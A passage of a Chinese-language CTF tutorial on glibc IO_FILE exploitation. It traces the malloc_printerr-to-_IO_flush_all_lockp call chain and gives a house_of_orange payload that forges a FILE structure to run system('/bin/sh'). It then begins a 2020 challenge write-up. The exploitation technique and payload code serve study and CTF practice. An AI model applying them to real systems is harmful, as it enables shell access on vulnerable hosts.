function">__libc_message</span> <span class="token punctuation">(</span>action <span class="token operator">&amp;</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"%s\n"</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>action <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      buf<span class="token punctuation">[</span><span class="token keyword">sizeof</span> <span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>      <span class="token keyword">char</span> <span class="token operator">*</span>cp <span class="token operator">=</span> <span class="token function">_itoa_word</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span> ptr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token keyword">sizeof</span> <span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span>cp <span class="token operator">></span> buf<span class="token punctuation">)</span>        <span class="token operator">*</span><span class="token operator">--</span>cp <span class="token operator">=</span> <span class="token string">'0'</span><span class="token punctuation">;</span>      <span class="token function">__libc_message</span> <span class="token punctuation">(</span>action <span class="token operator">&amp;</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"*** Error in `%s': %s: 0x%s ***\n"</span><span class="token punctuation">,</span>                      __libc_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token punctuation">:</span> <span class="token string">"&lt;unknown>"</span><span class="token punctuation">,</span> str<span class="token punctuation">,</span> cp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>action <span class="token operator">&amp;</span> <span class="token number">2</span><span class="token punctuation">)</span>    <span class="token function">abort</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>可以看到<code>malloc_printerr</code>函数调用了<code>libc_message</code>函数，跟进<code>libc_message</code></p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span><span class="token function">__libc_message</span> <span class="token punctuation">(</span><span class="token keyword">int</span> do_abort<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>fmt<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  va_list ap<span class="token punctuation">;</span>  <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token function">va_start</span> <span class="token punctuation">(</span>ap<span class="token punctuation">,</span> fmt<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">ifdef</span> FATAL_PREPARE</span>  FATAL_PREPARE<span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token function">va_end</span> <span class="token punctuation">(</span>ap<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>do_abort<span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">BEFORE_ABORT</span> <span class="token punctuation">(</span>do_abort<span class="token punctuation">,</span> written<span class="token punctuation">,</span> fd<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">/* Kill the application.  */</span>      <span class="token function">abort</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><code>__libc_message</code>函数调用了<code>abort</code>函数，我们继续跟进<code>abort</code>函数</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span><span class="token function">abort</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">struct</span> sigaction act<span class="token punctuation">;</span>  sigset_t sigs<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* First acquire the lock.  */</span>  <span class="token function">__libc_lock_lock_recursive</span> <span class="token punctuation">(</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Now it's for sure we are alone.  But recursive calls are possible.  */</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token comment" spellcheck="true">/* Flush all streams.  We cannot close them now because the user     might have registered a handler for SIGABRT.  */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>stage <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token operator">++</span>stage<span class="token punctuation">;</span>      <span class="token function">fflush</span> <span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span></code></pre><p>然后abort又调用了fflush函数</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> fflush(s) _IO_flush_all_lockp (0)</span></code></pre><p>而实际上<code>fflush</code>就是<code>_IO_flush_all_lockp</code>，继续跟进到<code>_IO_flush_all_lockp</code>函数中</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span><span class="token function">_IO_flush_all_lockp</span> <span class="token punctuation">(</span><span class="token keyword">int</span> do_lock<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">struct</span> _IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>  <span class="token keyword">int</span> last_stamp<span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">ifdef</span> _IO_MTSAFE_IO</span>  <span class="token function">__libc_cleanup_region_start</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">,</span> flush_cleanup<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">)</span>    <span class="token function">_IO_lock_lock</span> <span class="token punctuation">(</span>list_all_lock<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>  last_stamp <span class="token operator">=</span> _IO_list_all_stamp<span class="token punctuation">;</span>  fp <span class="token operator">=</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span><span class="token punctuation">)</span> _IO_list_all<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将_IO_list_all赋给fp</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>fp <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      run_fp <span class="token operator">=</span> fp<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">)</span>    <span class="token function">_IO_flockfile</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fp<span class="token operator">-></span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">></span> fp<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span><span class="token macro property">#<span class="token directive keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span>       <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">_IO_vtable_offset</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>           <span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_mode <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_wide_data<span class="token operator">-></span>_IO_write_ptr                    <span class="token operator">></span> fp<span class="token operator">-></span>_wide_data<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>       <span class="token punctuation">)</span>      <span class="token operator">&amp;&amp;</span> <span class="token function">_IO_OVERFLOW</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//我们的目标，在伪造的FILE结构体中将_IO_OVERFLOW设置为system，fp开头的值，即_flag设置为/bin/sh</span>          <span class="token comment" spellcheck="true">//要执行_IO_OVERFLOW，我们需要满足if判断的条件</span>    result <span class="token operator">=</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">)</span>    <span class="token function">_IO_funlockfile</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>      run_fp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>last_stamp <span class="token operator">!=</span> _IO_list_all_stamp<span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">/* Something was added to the list.  Start all over again.  */</span>      fp <span class="token operator">=</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span><span class="token punctuation">)</span> _IO_list_all<span class="token punctuation">;</span>      last_stamp <span class="token operator">=</span> _IO_list_all_stamp<span class="token punctuation">;</span>    <span class="token punctuation">}</span>      <span class="token keyword">else</span>    fp <span class="token operator">=</span> fp<span class="token operator">-></span>_chain<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token macro property">#<span class="token directive keyword">ifdef</span> _IO_MTSAFE_IO</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">)</span>    <span class="token function">_IO_lock_unlock</span> <span class="token punctuation">(</span>list_all_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__libc_cleanup_region_end</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>根据源码，我们能得出，要执行<code>_IO_OVERFLOW</code>函数，需要满足以下两种条件中的一种</p><pre class=" language-c"><code class="language-c">fp<span class="token operator">-></span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">></span> fp<span class="token operator">-></span>_IO_write_base</code></pre><p>或者</p><pre class=" language-c"><code class="language-c"><span class="token function">_IO_vtable_offset</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token comment" spellcheck="true">//# define _IO_vtable_offset(THIS) (THIS)->_vtable_offset</span><span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_mode <span class="token operator">></span> <span class="token number">0</span><span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_wide_data<span class="token operator">-></span>_IO_write_ptr<span class="token operator">></span> fp<span class="token operator">-></span>_wide_data<span class="token operator">-></span>_IO_write_base</code></pre><p>很明显，第一种条件要比第二种更容易满足，条件二除了当前FILE结构体，还涉及到一个<code>_wide_data</code>结构体，在此不作讨论，仅讨论第一种情况下的利用实现</p><p>在<code>_IO_flush_all_lockp</code>源码中，我们看到<code>_IO_OVERFLOW</code>函数的第一个参数是从<code>_IO_list_all</code>开始的一系列<code>_IO_FILE</code>结构体，<code>_IO_flush_all_lockp</code>会从<code>_IO_list_all</code>开始沿着<code>_chian</code>寻找到下一个<code>IO_FILE</code>并刷新。一般情况下<code>_IO_list_all</code>的值是<code>_IO_2_1_stderr</code>的指针，如果我们能够将<code>_IO_list_all</code>的值修改为我们可控的区域的地址，然后在该区域伪造一个FILE结构体，按照if条件设置好对应的值，将<code>_IO_OVERFLOW</code>设置为<code>system</code>函数的地址，这样当我们触发<code>malloc_printerr</code>时便会沿着调用链一路执行，最终执行<code>system("/bin/sh")</code>。</p><p>手动构造FILE结构体比较麻烦，推荐<a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more" target="_blank" rel="noopener">veritas501</a>师傅写的FILE结构体伪造模块，或者raycp师傅的<a href="https://github.com/ray-cp/pwn_debug" target="_blank" rel="noopener">pwn_debug</a>项目，也有对应的FILE结构体伪造模块</p><p>通过两个例题加深对IO_FILE伪造的理解</p><h3 id="0x1-house-of-orange"><a href="#0x1-house-of-orange" class="headerlink" title="0x1.house_of_orange"></a>0x1.house_of_orange</h3><p>完整过程就不说了，重点在于伪造FILE结构体</p><p>程序存在堆溢出，并且最大可申请0x1000的chunk，先利用堆溢出修改topchunk的大小，再申请一个大于topchunk大小的chunk，将topchunk放入unsortedbin(操作原理就不说了，可以去看看别的师傅的讲解)，再申请一个largebin大小的chunk就可以分别泄露出libc地址和heap地址了。接下来就是最关键的操作，将unsortedbin的size修改为0x61，并且直接将unsortedbin伪造为一个FILE结构体</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#借助pwn_debug进行FILE结构体构造</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x400</span> <span class="token comment" spellcheck="true">#largebin</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#orange结构体在用户申请的chunk下方，大小为0x20</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x1f</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#orange结构体有两个值，一个为price，一个为color，分别占4字节</span>fake_file <span class="token operator">=</span> IO_FILE_plus<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#创建一个IO_FILE对象</span>fake_file<span class="token punctuation">.</span>_flags <span class="token operator">=</span> u64<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#设置_flag为binsh，_flag的位置为unsorted bin的presize</span>fake_file<span class="token punctuation">.</span>_IO_read_ptr <span class="token operator">=</span> <span class="token number">0x61</span><span class="token comment" spellcheck="true">#修改unsorted bin的size为0x61</span>fake_file<span class="token punctuation">.</span>_IO_read_base<span class="token operator">=</span>_IO_list_all<span class="token number">-0x10</span><span class="token comment" spellcheck="true">#修改unsorted bin的bk指针为_IO_list_all-0x10</span>fake_file<span class="token punctuation">.</span>_IO_write_ptr<span class="token operator">=</span><span class="token number">0</span>fake_file<span class="token punctuation">.</span>_IO_write_ptr<span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">#满足_IO_write_ptr > _IO_write_ptr</span>fake_file<span class="token punctuation">.</span>_mode<span class="token operator">=</span><span class="token number">0</span><span class="token comment" spellcheck="true">#满足_mode&lt;=0</span>fake_file<span class="token punctuation">.</span>vtable<span class="token operator">=</span>heap_base<span class="token operator">+</span><span class="token number">0x4f0</span><span class="token operator">+</span>fake_file<span class="token punctuation">.</span>size<span class="token comment" spellcheck="true">#设置vtable指向fake_file下方</span>pay <span class="token operator">+=</span> str<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>  <span class="token comment" spellcheck="true"># vtable，_IO_OVERFLOW在_IO_jump_t中的偏移为0x18</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 设置_IO_OVERFLOW为system，</span>upgrade<span class="token punctuation">(</span><span class="token number">0x800</span><span class="token punctuation">,</span> pay<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span></code></pre><p>解释一下这一段，将unsorted bin的bk指针设置为_IO_list_all-0x10，这样当我们申请chunk时便会触发unsorted bin attack</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* remove from unsorted list */</span><span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>bck<span class="token operator">-></span>fd <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>结果便是将main_arena+88写入<code>_IO_list_all</code>，则<code>_IO_list_all</code>指向了main_arena+88，因为我们将unsorted bin的size修改为0x61，这个unsorted bin会被放入大小为0x60的small bin中，0x60的smallbin地址的存储位置相对于main_arena+88为0x68，而chain在FILE结构体中的偏移也为0x68。顺便附上结构体的偏移量</p><pre class=" language-c"><code class="language-c"><span class="token number">0x0</span>   _flags<span class="token number">0x8</span>   _IO_read_ptr<span class="token number">0x10</span>  _IO_read_end<span class="token number">0x18</span>  _IO_read_base<span class="token number">0x20</span>  _IO_write_base<span class="token number">0x28</span>  _IO_write_ptr<span class="token number">0x30</span>  _IO_write_end<span class="token number">0x38</span>  _IO_buf_base<span class="token number">0x40</span>  _IO_buf_end<span class="token number">0x48</span>  _IO_save_base<span class="token number">0x50</span>  _IO_backup_base<span class="token number">0x58</span>  _IO_save_end<span class="token number">0x60</span>  _markers<span class="token number">0x68</span>  _chain<span class="token number">0x70</span>  _fileno<span class="token number">0x74</span>  _flags2<span class="token number">0x78</span>  _old_offset<span class="token number">0x80</span>  _cur_column<span class="token number">0x82</span>  _vtable_offset<span class="token number">0x83</span>  _shortbuf<span class="token number">0x88</span>  _lock<span class="token number">0x90</span>  _offset<span class="token number">0x98</span>  _codecvt<span class="token number">0xa0</span>  _wide_data<span class="token number">0xa8</span>  _freeres_list<span class="token number">0xb0</span>  _freeres_buf<span class="token number">0xb8</span>  __pad5<span class="token number">0xc0</span>  _mode<span class="token number">0xc4</span>  _unused2<span class="token number">0xd8</span>  vtable</code></pre><p>又由于unsortedbin attack的缘故，会触发如下代码</p><pre class=" language-c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          bck <span class="token operator">=</span> victim<span class="token operator">-></span>bk<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>victim<span class="token operator">-></span>size <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>              <span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>victim<span class="token operator">-></span>size <span class="token operator">></span> av<span class="token operator">-></span>system_mem<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"malloc(): memory corruption"</span><span class="token punctuation">,</span>                             <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>malloc会出错，这样就会调用malloc_printerr函数，触发<code>_IO_flush_all_lockp</code>，通过IO_list_all找到找到main_arena+88,再通过chian找到我们伪造的FILE结构体，然后找到vtable，触发<code>_IO_OVERFLOW</code>，执行system(“/bin/sh”)</p><h3 id="0x2-蓝帽杯2020-camp"><a href="#0x2-蓝帽杯2020-camp" class="headerlink" title="0x2.蓝帽杯2020 camp"></a>0x2.蓝帽杯2020 camp</h3><p>libc2.23，保护全开</p><p><img src="/LawlietLW.github.io/2020/08/08/io-file-xue-xi/1.jpg" alt></p><p>菜单题</p><p><img src="/LawlietLW.github.io/2020/08/08/io-file-xue-xi/2.jpg" alt></p><p>看到第一个功能stdout</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">out</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">int</span> nbytes<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4h] [rbp-1Ch]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  nbytes <span class="token operator">=</span> <span class="token function">sub_C31</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> nbytes <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> nbytes <span class="token operator">></span> <span class="token number">0xF0</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"error."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"content:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  buf <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_202040 <span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">*</span> chunk_num<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"stdout"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_202040 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> chunk_num<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> nbytes<span class="token punctuation">;</span>  v0 <span class="token operator">=</span> chunk_num<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_202040 <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> v0 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Finish."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v4<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>malloc一个chunk，往chunk里写东西，再将chunk里的数据memcpy到<code>_IO_2_1_stdout_</code>结构体中</p><p>剩下的stdin和stderr功能也都和stdout一样，只不过将<code>_IO_2_1_stdout_</code>换成了<code>_IO_2_1_stdin_</code>和<code>_IO_2_1_stderr_</code></p><p>log功能就是打印出所有的chunk的内容，clear就是free掉所有chunk并将指针清零</p><p>一开始没找到漏洞点，后来看到了stdout、stdin和stderr，想起来利用_IO_FILE</p><p>开始利用</p><p>首先泄露libc地址，既然能直接往<code>_IO_2_1_stdout_</code>上写数据，那就直接利用<code>_IO_2_1_stdout_</code>泄露libc地址。然后修改stdout的vtable指针指向stdout，将stderr构造成vtable,之后由于会调用printf，printf的调用栈为</p><pre class=" language-c"><code class="language-c">vfprintf<span class="token operator">+</span><span class="token number">11</span>_IO_file_xsputn_IO_file_overflowfunlockfilec_IO_file_writewrite</code></pre><p>这里引用ctfwiki上的说明</p><pre><code>printf和puts是常用的输出函数，在printf的参数是以'\n'结束的纯字符串时，printf会被优化为puts函数并去除换行符。puts在源码中实现的函数是_IO_puts，这个函数的操作与fwrite的流程大致相同，函数内部同样会调用vtable中的_IO_sputn，结果会执行_IO_new_file_xsputn，最后会调用到系统接口write函数。</code></pre><p>因为在vtable中有</p><pre class=" language-c"><code class="language-c"><span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_xsputn_t<span class="token punctuation">,</span> __xsputn<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>而</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></code></pre><p>看到<code>_IO_puts</code>函数</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span><span class="token function">_IO_puts</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>  _IO_size_t len <span class="token operator">=</span> <span class="token function">strlen</span> <span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_IO_acquire_lock</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">_IO_vtable_offset</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span>       <span class="token operator">||</span> <span class="token function">_IO_fwide</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>      <span class="token operator">&amp;&amp;</span> <span class="token function">_IO_sputn</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">,</span> str<span class="token punctuation">,</span> len<span class="token punctuation">)</span> <span class="token operator">==</span> len      <span class="token operator">&amp;&amp;</span> <span class="token function">_IO_putc_unlocked</span> <span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> _IO_stdout<span class="token punctuation">)</span> <span class="token 